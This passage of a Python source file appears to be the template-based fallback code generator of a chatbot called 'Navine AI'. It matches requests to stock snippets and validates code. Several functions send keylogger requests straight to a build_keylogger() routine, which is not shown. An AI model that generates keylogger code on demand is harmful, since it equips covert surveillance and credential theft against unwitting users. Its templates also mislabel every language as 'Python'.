            "window app",
            "make a gui",
            "create a gui",
            "gui window",
        ],
        "python",
        PYTHON_GUI_APP,
    ),
    (["hello world", "print hello"], "python", 'print("Hello, World!")'),
    (
        ["java hello", "hello world java", "java hello world", "hello world in java"],
        "java",
        (
            "public class HelloWorld {\n"
            "    public static void main(String[] args) {\n"
            "        System.out.println(\"Hello, World!\");\n"
            "    }\n"
            "}"
        ),
    ),
    (
        ["java main", "java class", "java program"],
        "java",
        (
            "public class Main {\n"
            "    public static void main(String[] args) {\n"
            "        System.out.println(\"Hello from Navine AI - Python\");\n"
            "    }\n"
            "}"
        ),
    ),
    (
        ["javascript hello", "js hello", "hello world javascript", "hello world js"],
        "javascript",
        'console.log("Hello, World!");',
    ),
    (
        ["c++ hello", "cpp hello", "hello world c++", "hello world cpp"],
        "cpp",
        (
            "#include <iostream>\n"
            "\n"
            "int main() {\n"
            "    std::cout << \"Hello, World!\" << std::endl;\n"
            "    return 0;\n"
            "}"
        ),
    ),
    (
        ["csharp hello", "c# hello", "hello world c#", "hello world csharp"],
        "csharp",
        (
            "using System;\n"
            "\n"
            "class Program {\n"
            "    static void Main() {\n"
            "        Console.WriteLine(\"Hello, World!\");\n"
            "    }\n"
            "}"
        ),
    ),
    (
        ["go hello", "golang hello", "hello world go"],
        "go",
        (
            "package main\n"
            "\n"
            "import \"fmt\"\n"
            "\n"
            "func main() {\n"
            "    fmt.Println(\"Hello, World!\")\n"
            "}"
        ),
    ),
    (
        ["rust hello", "hello world rust"],
        "rust",
        'fn main() {\n    println!("Hello, World!");\n}',
    ),
    (["add two numbers", "adds two numbers", "sum of two numbers", "add two", "sum two"], "python", "def add(a: int, b: int) -> int:\n    return a + b"),
    (["fibonacci", "fib"], "python", "def fibonacci(n: int) -> int:\n    if n <= 1:\n        return n\n    a, b = 0, 1\n    for _ in range(2, n + 1):\n        a, b = b, a + b\n    return b"),
    (["reverse string", "reverse a string", "string reverse"], "python", "def reverse_string(s: str) -> str:\n    return s[::-1]"),
    (["binary search"], "python", "def binary_search(arr: list, target: int) -> int:\n    lo, hi = 0, len(arr) - 1\n    while lo <= hi:\n        mid = (lo + hi) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            lo = mid + 1\n        else:\n            hi = mid - 1\n    return -1"),
    (["bubble sort"], "python", "def bubble_sort(arr: list) -> list:\n    items = list(arr)\n    n = len(items)\n    for i in range(n):\n        for j in range(0, n - i - 1):\n            if items[j] > items[j + 1]:\n                items[j], items[j + 1] = items[j + 1], items[j]\n    return items"),
    (["quick sort", "quicksort"], "python", "def quicksort(arr: list) -> list:\n    if len(arr) <= 1:\n        return list(arr)\n    pivot = arr[len(arr) // 2]\n    left = [x for x in arr if x < pivot]\n    mid = [x for x in arr if x == pivot]\n    right = [x for x in arr if x > pivot]\n    return quicksort(left) + mid + quicksort(right)"),
    (["merge sort", "mergesort"], "python", "def mergesort(arr: list) -> list:\n    if len(arr) <= 1:\n        return list(arr)\n    mid = len(arr) // 2\n    left = mergesort(arr[:mid])\n    right = mergesort(arr[mid:])\n    out = []\n    i = j = 0\n    while i < len(left) and j < len(right):\n        if left[i] <= right[j]:\n            out.append(left[i])\n            i += 1\n        else:\n            out.append(right[j])\n            j += 1\n    out.extend(left[i:])\n    out.extend(right[j:])\n    return out"),
    (["palindrome"], "python", "def is_palindrome(s: str) -> bool:\n    cleaned = ''.join(c.lower() for c in s if c.isalnum())\n    return cleaned == cleaned[::-1]"),
    (["factorial"], "python", "def factorial(n: int) -> int:\n    if n <= 1:\n        return 1\n    result = 1\n    for i in range(2, n + 1):\n        result *= i\n    return result"),
    (["is even", "check even", "even number"], "python", "def is_even(n: int) -> bool:\n    return n % 2 == 0"),
    (["count vowels", "vowel count"], "python", "def count_vowels(text: str) -> int:\n    vowels = set('aeiouAEIOU')\n    return sum(1 for ch in text if ch in vowels)"),
    (["find max", "maximum in a list", "max in list"], "python", "def find_max(values: list):\n    if not values:\n        raise ValueError('empty list')\n    best = values[0]\n    for item in values[1:]:\n        if item > best:\n            best = item\n    return best"),
    (["linked list", "singly linked list"], "python", "class Node:\n    def __init__(self, value):\n        self.value = value\n        self.next = None\n\n\nclass LinkedList:\n    def __init__(self):\n        self.head = None\n\n    def append(self, value):\n        node = Node(value)\n        if not self.head:\n            self.head = node\n            return\n        cur = self.head\n        while cur.next:\n            cur = cur.next\n        cur.next = node"),
    (["http get", "requests get", "fetch url python"], "python", "import urllib.request\n\n\ndef http_get(url: str) -> str:\n    with urllib.request.urlopen(url, timeout=20) as resp:\n        return resp.read().decode('utf-8', errors='replace')"),
    (["json load file", "read json", "load json"], "python", "import json\nfrom pathlib import Path\n\n\ndef load_json(path: str):\n    return json.loads(Path(path).read_text(encoding='utf-8'))"),
    (["stack"], "python", "class Stack:\n    def __init__(self):\n        self._items = []\n    def push(self, item):\n        self._items.append(item)\n    def pop(self):\n        return self._items.pop()\n    def is_empty(self):\n        return len(self._items) == 0"),
    (["queue", "fifo queue"], "python", "from collections import deque\n\n\nclass Queue:\n    def __init__(self):\n        self._items = deque()\n    def enqueue(self, item):\n        self._items.append(item)\n    def dequeue(self):\n        return self._items.popleft()\n    def is_empty(self):\n        return not self._items"),
    (["read file", "read lines", "file read"], "python", "def read_lines(path: str) -> list:\n    with open(path, 'r', encoding='utf-8') as f:\n        return [line.rstrip('\\n') for line in f]"),
    (["word frequency", "count words"], "python", "def word_frequency(text: str) -> dict:\n    counts = {}\n    for word in text.lower().split():\n        counts[word] = counts.get(word, 0) + 1\n    return counts"),
    (["flatten", "nested list"], "python", "def flatten(nested: list) -> list:\n    result = []\n    for item in nested:\n        if isinstance(item, list):\n            result.extend(flatten(item))\n        else:\n            result.append(item)\n    return result"),
    (["regex match", "match regex"], "python", "import re\n\n\ndef first_match(pattern: str, text: str):\n    m = re.search(pattern, text)\n    return m.group(0) if m else None"),
    (["debounce"], "javascript", "function debounce(fn, wait = 200) {\n  let timer;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), wait);\n  };\n}"),
    (["sum array", "sum list"], "javascript", "function sumArray(arr) {\n    return arr.reduce((a, b) => a + b, 0);\n}"),
    (["add two numbers", "adds two numbers"], "javascript", "function add(a, b) {\n  return a + b;\n}"),
    (["fetch json"], "javascript", "async function fetchJson(url) {\n    const res = await fetch(url);\n    if (!res.ok) throw new Error(res.statusText);\n    return res.json();\n}"),
]

GENERIC_TEMPLATES: Dict[str, str] = {
    "python": "def main():\n    print(\"Hello from Navine AI - Python\")\n\n\nif __name__ == \"__main__\":\n    main()",
    "javascript": "function main() {\n    console.log(\"Hello from Navine AI - Python\");\n}\n\nmain();",
    "typescript": "function main(): void {\n    console.log(\"Hello from Navine AI - Python\");\n}\n\nmain();",
    "rust": "fn main() {\n    println!(\"Hello from Navine AI - Python\");\n}",
    "go": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello from Navine AI - Python\")\n}",
    "java": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello from Navine AI - Python\");\n    }\n}",
    "cpp": "#include <iostream>\n\nint main() {\n    std::cout << \"Hello from Navine AI - Python\" << std::endl;\n    return 0;\n}",
    "csharp": "using System;\n\nclass Program {\n    static void Main() {\n        Console.WriteLine(\"Hello from Navine AI - Python\");\n    }\n}",
    "kotlin": "fun main() {\n    println(\"Hello from Navine AI - Python\")\n}",
    "swift": "import Foundation\n\nprint(\"Hello from Navine AI - Python\")",
    "php": "<?php\n\nfunction main(): void {\n    echo \"Hello from Navine AI - Python\" . PHP_EOL;\n}\n\nmain();",
    "ruby": "def main\n  puts \"Hello from Navine AI - Python\"\nend\n\nmain",
    "sql": "SELECT 'Hello from Navine AI - Python' AS message;",
    "bash": "#!/usr/bin/env bash\nset -euo pipefail\n\necho \"Hello from Navine AI - Python\"",
    "batch": "@echo off\r\necho Hello from Navine AI - Python\r\npause\r\n",
    "bat": "@echo off\r\necho Hello from Navine AI - Python\r\npause\r\n",
    "lua": "print(\"Hello from Navine AI - Python\")",
    "scala": "object Main {\n  def main(args: Array[String]): Unit = {\n    println(\"Hello from Navine AI - Python\")\n  }\n}",
    "haskell": "main :: IO ()\nmain = putStrLn \"Hello from Navine AI - Python\"",
    "r": "cat(\"Hello from Navine AI - Python\\n\")",
    "dart": "void main() {\n  print('Hello from Navine AI - Python');\n}",
    "elixir": "IO.puts(\"Hello from Navine AI - Python\")",
    "perl": "print \"Hello from Navine AI - Python\\n\";",
    "matlab": "disp('Hello from Navine AI - Python')",
}


def generic_code_template(language: Optional[str] = None) -> str:
    lang = (language or "python").lower()
    return GENERIC_TEMPLATES.get(lang, GENERIC_TEMPLATES["python"])

STOP_WORDS = {
    "a", "an", "the", "to", "for", "in", "on", "of", "and", "or", "with",
    "write", "create", "make", "build", "implement", "function", "code",
    "python", "javascript", "script", "program", "please", "me", "that",
    "this", "using", "simple", "basic", "how", "can", "you", "i", "my",
}


def tokenize_task(task: str) -> List[str]:
    words = re.findall(r"[a-z0-9]+", task.lower())
    return [w for w in words if len(w) > 1 and w not in STOP_WORDS]


def has_excessive_repetition(text: str) -> bool:
    if not text:
        return True
    words = re.findall(r"\b\w+\b", text.lower())
    if len(words) < 3:
        return False
    counts = {}
    for word in words:
        counts[word] = counts.get(word, 0) + 1
    max_count = max(counts.values())
    if max_count >= 4 and max_count / len(words) > 0.25:
        return True
    for i in range(len(words) - 2):
        if words[i] == words[i + 1] == words[i + 2]:
            return True
    filler = {"and", "with", "the", "a", "or", "to", "in", "of", "is", "it"}
    filler_count = sum(1 for w in words if w in filler)
    if len(words) >= 6 and filler_count / len(words) > 0.6:
        return True
    return False


def looks_like_worksheet_code(text: str) -> bool:
    lower = (text or "").lower()
    markers = (
        "welcome to java",
        "this may be your first",
        "replace the",
        "write code here",
        "infamous hello world",
        "your journey with",
        "todo:",
        "fill in the blank",
        "your code here",
    )
    return any(m in lower for m in markers)


def _braces_balanced(text: str) -> bool:
    return text.count("{") == text.count("}") and text.count("(") == text.count(")")


def looks_like_valid_code(text: str, language: str) -> bool:
    if not text or len(text.strip()) < 8:
        return False
    if has_excessive_repetition(text):
        return False
    if looks_like_worksheet_code(text):
        return False
    if re.search(r"(?:import>|def-|print\(\"Dernel\"\)|double_list\(\))", text, re.I):
        return False
    if re.search(r"\bpublic\s+public\b|\bclass\s+class\b|\bvoid\s+void\b", text, re.I):
        return False
    if re.search(r"[<>]{1}.*\bdef\b|\bdef\b.*[;{}]", text) and "python" in language.lower():
        if not re.search(r"def\s+\w+\s*\(", text):
            return False
    lang = language.lower()
    if lang in ("batch", "bat", "cmd"):
        return bool(
            re.search(r"(?i)@?echo\s+off|\bgoto\s+:|\bset(?:local|\s+/p|\s+\w+=)", text)
        ) and len(text.strip()) >= 40
    if lang == "python":
        if re.search(r"\b(Glossary|Wikipedia|encyclopedia|disambiguation)\b", text, re.I):
            return False
        if re.search(r"\bimport\s+tkinter\b", text) and re.search(r"\b(?:mainloop|Tk\s*\()", text):
            return True
        if re.search(r"\b(?:PyQt5|PyQt6|PySide2|PySide6)\b", text) and re.search(
            r"\b(?:QApplication|QMainWindow|exec_\s*\(|\.exec\s*\()", text
        ):
            return True
        if re.search(r"\bimport\s+pygame\b", text) and re.search(
            r"\b(?:pygame\.display|pygame\.init|pygame\.quit)\b", text
        ):
            return True
        if re.search(r"def\s+[A-Za-z_]\w*\s*\(", text) or re.search(r"class\s+[A-Za-z_]\w*\s*[:\(]", text):
            return True
        signals = sum(1 for kw in ("import ", "return ", "print(", "for ", "while ", "if ", "elif ") if kw in text)
        return signals >= 2 and bool(re.search(r"[:=]", text))
    if lang in ("javascript", "typescript"):
        if not re.search(r"\b(function|const|let|var|return|class|=>|console\.log)\b", text):
            return False
        return _braces_balanced(text) or "=>" in text or "console.log" in text
    if lang == "rust":
        return bool(re.search(r"\bfn\s+\w+", text)) and _braces_balanced(text)
    if lang == "go":
        return bool(re.search(r"\bpackage\s+\w+", text) and re.search(r"\bfunc\s+", text)) and _braces_balanced(text)
    if lang == "java":
        if not re.search(r"\b(?:public\s+)?class\s+[A-Za-z_]\w*", text):
            return False
        if not _braces_balanced(text):
            return False
        has_main = bool(re.search(r"\b(?:public\s+)?static\s+void\s+main\s*\(\s*String", text))
        has_stmt = bool(re.search(r"\bSystem\.out\.(?:print|println)\s*\(|\breturn\b|\bnew\s+\w+", text))
        return has_main and (has_stmt or "main" in text)
    if lang == "cpp":
        return bool(re.search(r"#include\s*<|int\s+main\s*\(", text)) and _braces_balanced(text)
    if lang == "csharp":
        return bool(re.search(r"\b(?:class|static\s+void\s+Main)\b", text)) and _braces_balanced(text)
    if lang == "kotlin":
        return bool(re.search(r"\b(fun|val|var|class|return|println)\b", text))
    if lang == "swift":
        return bool(re.search(r"\b(func|let|var|class|struct|print|return)\b", text))
    if lang == "php":
        return bool(re.search(r"(<\?php|\bfunction\b|\becho\b|\$[a-zA-Z_])", text))
    if lang == "ruby":
        return bool(re.search(r"\b(def|end|puts|class|module|return)\b", text))
    if lang == "sql":
        return bool(re.search(r"\b(select|insert|update|delete|create|from|where)\b", text, re.I))
    if lang == "bash":
        return bool(re.search(r"(#!/.*sh|\becho\b|\bfor\b|\bif\b|\bwhile\b|\bfunction\b|\$\w+)", text))
    return len(text.strip()) >= 20 and not has_excessive_repetition(text)


def score_entry(task: str, prompt: str, keywords: List[str]) -> int:
    lower = task.lower()
    prompt_lower = prompt.lower()
    score = 0
    for word in tokenize_task(task):
        if word in prompt_lower:
            score += 2
    for kw in keywords:
        if kw in lower:
            score += 3
    return score


def lookup_builtin_template(task: str, language: Optional[str] = None) -> Optional[Tuple[str, str]]:
    lower = (task or "").lower()
    gui_ask = wants_gui_code(task)
    hello_ask = wants_hello_world(task)
    lang_pref = (language or "").lower() or None

    if wants_keylogger(task):
        return build_keylogger(task)
    if wants_multi_tool(task):
        return build_multi_tool_batch(task)

    if gui_ask and (lang_pref in (None, "python", "")):
        built = build_gui_for_task(task)
        if built:
            return built

    best = None
    best_score = 0
    for keywords, lang, code in BUILTIN_TEMPLATES:
        if language and lang != language:
            continue
        is_console_hello = code.strip().startswith("print(") and "hello" in " ".join(keywords)
        if is_console_hello and gui_ask:
            continue
        is_gui_template = (
            "tkinter" in code
            or "PyQt" in code
            or "pygame" in code
            or "QApplication" in code
            or "QMainWindow" in code
        )
        if is_gui_template and wants_pyqt(task) and "QApplication" not in code:
            continue
        if is_gui_template and wants_pygame(task) and "pygame" not in code:
            continue
        if is_gui_template and not gui_ask and not any(
            k in lower for k in ("gui", "tkinter", "tk", "pyqt", "pygame", "window")
        ):
            continue
        phrase_hits = sum(1 for kw in keywords if kw in lower)
        score = score_entry(task, " ".join(keywords), keywords) + phrase_hits * 4
        if is_gui_template and gui_ask:
            score += 20
        if is_console_hello and hello_ask and not gui_ask:
            score += 8
        if lang_pref and lang == lang_pref and hello_ask and "hello" in " ".join(keywords):
            score += 12
        if score > best_score:
            best_score = score
            best = (code, lang)
    if wants_multi_tool(task):
        return build_multi_tool_batch(task)
    if wants_keylogger(task):
        return build_keylogger(task)
    if best and best_score >= 4:
        return best
    if hello_ask and lang_pref and lang_pref in GENERIC_TEMPLATES:
        if lang_pref == "java":
            return (
                "public class HelloWorld {\n"
                "    public static void main(String[] args) {\n"
                "        System.out.println(\"Hello, World!\");\n"
                "    }\n"
                "}",
                "java",
            )
        if lang_pref == "python":
            return 'print("Hello, World!")', "python"
        return GENERIC_TEMPLATES[lang_pref], lang_pref
    return None


def load_jsonl_entries(path: Path) -> List[dict]:
    if not path.exists():
        return []
    entries = []
    for line in path.read_text(encoding="utf-8").splitlines():
        if line.strip():
            try:
                entries.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return entries


def lookup_dataset_code(task: str, language: Optional[str] = None) -> Optional[Tuple[str, str, int]]:
    task_words = tokenize_task(task)
    if not task_words:
        return None
    root = get_project_root()
    sources = [
        root / "data" / "text" / "sample_code.jsonl",
    ]
    coding_dir = root / "data" / "train" / "coding"
    if language and coding_dir.is_dir():
        lang_file = coding_dir / f"{language}.jsonl"
        if lang_file.exists() and lang_file.stat().st_size < 2_000_000:
            sources.insert(0, lang_file)
    best = None
    best_score = 0
    best_lang = language or "python"
    for source in sources:
        for entry in load_jsonl_entries(source):
            entry_lang = entry.get("language", "python")
            if language and entry_lang != language:
                continue
            prompt = entry.get("prompt", "")
            code = entry.get("code", "")
            if not code or len(code) < 10:
                continue
            if looks_like_worksheet_code(code) or not looks_like_valid_code(code, entry_lang):
                continue
            prompt_lower = prompt.lower()
            matched = [w for w in task_words if w in prompt_lower]
            if len(matched) < 2 and not any(len(w) >= 6 and w in prompt_lower for w in task_words):
                continue
            overlap = len(matched) / max(len(task_words), 1)
            score = score_entry(task, prompt, tokenize_task(prompt))
            score += len(matched) * 2
            if overlap >= 0.6:
                score += 6
            if score > best_score:
                best_score = score
                best = code
                best_lang = entry_lang
    if best and best_score >= 8:
        return best, best_lang, best_score
    return None


def resolve_code_fallback(task: str, language: Optional[str] = None) -> Optional[Tuple[str, str]]:
    lang = (language or "python").lower()
    if wants_keylogger(task):
        return build_keylogger(task)
    if wants_multi_tool(task):
        return build_multi_tool_batch(task)
    if wants_gui_code(task) and (language in (None, "python") or lang == "python"):
        built = build_gui_for_task(task)
        if built:
            return built
    builtin = lookup_builtin_template(task, language)
    if builtin:
        return builtin
    dataset = lookup_dataset_code(task, language)
    if dataset:
        code, lang = dataset[0], dataset[1]
        if wants_gui_code(task) and (language in (None, "python") or (language or "").lower() == "python"):
            built = build_gui_for_task(task)
            if built:
                return built
        return code, lang
    return None


def format_code_response(code: str, language: str) -> str:
    cleaned = str(code or "").replace("\r\n", "\n").replace("\r", "\n").rstrip() + "\n"
    return f"Here is the {language} code:\n\n```{language}\n{cleaned}```"
